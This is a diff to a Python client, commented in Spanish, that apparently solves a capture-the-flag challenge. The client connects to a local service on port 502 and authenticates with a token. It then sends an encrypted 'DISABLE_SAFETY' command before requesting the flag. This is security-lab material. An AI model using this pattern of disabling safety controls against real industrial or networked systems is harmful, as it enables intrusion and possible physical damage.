@@ -23,7 +23,7 @@ def send_command(client_id):
     """Conecta al servidor y solicita la flag directamente"""
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
-            s.connect(('localhost', 15502))  # Cambia 'localhost' si es necesario
+            s.connect(('localhost', 502))  # Cambia 'localhost' si es necesario
 
             # Paso 1: Autenticación
             token = generate_dynamic_token()
@@ -40,7 +40,15 @@ def send_command(client_id):
             # Crear el cifrador con la clave de sesión
             cipher = AES.new(session_key, AES.MODE_ECB)
 
-            # Paso 2: Solicitar la flag directamente
+            # Paso 2: Deshabilitar la seguridad
+            disable_safety_command = "DISABLE_SAFETY"
+            encrypted_disable_safety_command = cipher.encrypt(pad(disable_safety_command.encode(), AES.block_size))
+            s.sendall(encrypted_disable_safety_command)
+
+            # Recibir respuesta sobre la redundancia
+            disable_safety_response = s.recv(1024)
+
+            # Paso 3: Solicitar la flag directamente
             get_flag_command = "GET_FLAG"
             encrypted_get_flag_command = cipher.encrypt(pad(get_flag_command.encode(), AES.block_size))
             s.sendall(encrypted_get_flag_command)
